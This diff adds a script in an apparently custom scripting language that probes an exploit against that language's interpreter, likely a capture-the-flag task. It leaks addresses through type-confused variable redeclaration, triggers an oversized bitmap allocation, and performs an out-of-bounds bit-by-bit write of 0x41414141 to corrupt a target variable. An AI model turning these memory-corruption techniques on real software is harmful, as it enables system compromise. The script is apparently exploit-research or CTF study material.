@@ -1,0 +1,66 @@
+print("=== Analyze Write Result ===");
+
+print("Step 1: Setup");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Original targetaddr:");
+print(targetaddr);
+
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 2: Check what we're reading");
+print("Before any write, read target:");
+int before = target;
+print("Before:");
+print(before);
+
+print("Step 3: Write full 0x41414141 (all 32 bits)");
+int bitindex = 29888;
+int testvalue = 1094795585;
+print("Writing all 32 bits of test value...");
+
+int bit = 0;
+while (bit < 32) {
+    int bitval = testvalue & 1;
+    set(b1, bitindex + bit, 0, bitval);
+    testvalue = testvalue / 2;
+    bit = bit + 1;
+}
+
+print("Write completed");
+
+print("Step 4: Read back");
+int after = target;
+print("After write:");
+print(after);
+
+if (after == 1094795585) {
+    print("SUCCESS! Full write worked!");
+} else {
+    print("Write didn't match expected value");
+    print("Checking if it's a different address...");
+    print("Maybe we're corrupting a different variable entry?");
+}
+
+print("Step 5: Try reading leak1 to see if it changed");
+int leak1check = leak1;
+print("leak1 value:");
+print(leak1check);
+if (leak1check == 1094795585) {
+    print("We corrupted leak1 instead of target!");
+}
+
+print("Step 6: Try reading other variables");
+int leak2 = 0;
+string leak2 = "second";
+int leak2check = leak2;
+print("leak2 value:");
+print(leak2check);
+if (leak2check == 1094795585) {
+    print("We corrupted leak2 instead of target!");
+}
+
